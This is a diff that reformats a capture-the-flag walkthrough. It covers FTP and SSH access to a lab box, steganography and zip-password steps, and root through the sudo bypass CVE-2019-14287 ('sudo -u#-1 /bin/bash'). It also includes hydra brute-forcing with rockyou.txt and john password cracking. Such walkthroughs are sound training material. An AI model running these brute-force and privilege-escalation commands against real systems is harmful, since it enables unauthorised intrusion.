@@ -71,17 +71,15 @@ Codename? Guessing the "Agent [letter]" is what they mean
 	Name: chris</br>
 	Pass: crystal
 
-ftp > ls
+	> ftp > ls
 
-	'''
-	-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-	-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-	-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
-	'''
+		'''
+		-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
+		-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
+		-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
+		'''
 	
-ftp > mget To_agentJ cute-alien.jpg cutie.png
-
-ftp > exit
+	> ftp > mget To_agentJ cute-alien.jpg cutie.png
 
 
 - To_agentJ.txt	
@@ -104,8 +102,7 @@ ftp > exit
 		'''
 		365  365.zlib  8702.zip  To_agentR.txt
 		'''
-	8702.zip is password protected
-		(see #Passwords#)
+	> 8702.zip is password protected</br>(see Passwords)
 
 - 7z e 8702.zip
 	> pass: alien
@@ -119,13 +116,11 @@ ftp > exit
 		By,
 		Agent R
 		'''
-	> QXJlYTUx
-		(see #Passwords#)
+	> QXJlYTUx</br>(see Passwords)
 
 
 - steghide extract -sf cute-alien.jpg > message.txt
-	pass: Area51
-		(see #Passwords#)
+	> pass: Area51</br>(see Passwords)
 	
 
 - message.txt
@@ -146,8 +141,7 @@ ftp > exit
 
 - ssh james@$IP</br>
 	pass: hackerrules!
-
-- ls
+	> ls
 
 		'''
 		Alien_autospy.jpg  user_flag.txt
@@ -169,7 +163,7 @@ ftp > exit
 - searching "(ALL, !root) /bin/bash"</br>
 		
 		CVE: 2019-14287
-		"sudo -u#-1 /bin/bash"
+		sudo -u#-1 /bin/bash
 
 - root gained
 
@@ -186,22 +180,22 @@ ftp > exit
 ----------------
 
 - chris' ftp
-	hydra -l chris -P rockyou.txt $IP ftp -o chris_pass
-	pass: crystal
+	> hydra -l chris -P rockyou.txt $IP ftp -o chris_pass</br>
+	  pass: crystal
 
 - 8702.zip
-	zip2john steno/_cutie.png.extracted/8702.zip > 8702john
-	john 8702john
-	pass: alien
+	> zip2john steno/_cutie.png.extracted/8702.zip > 8702john</br>
+	  john 8702john</br>
+	  pass: alien
 
 - QXJlYTUx
-	CyberChef
-	base64: Area51
+	> CyberChef</br>
+	  base64: Area51
 
 ---------------
 	Exposed
 ---------------
 
 - message.txt
-	user: james
+	> user: james</br>
  	pass: hackerrules!
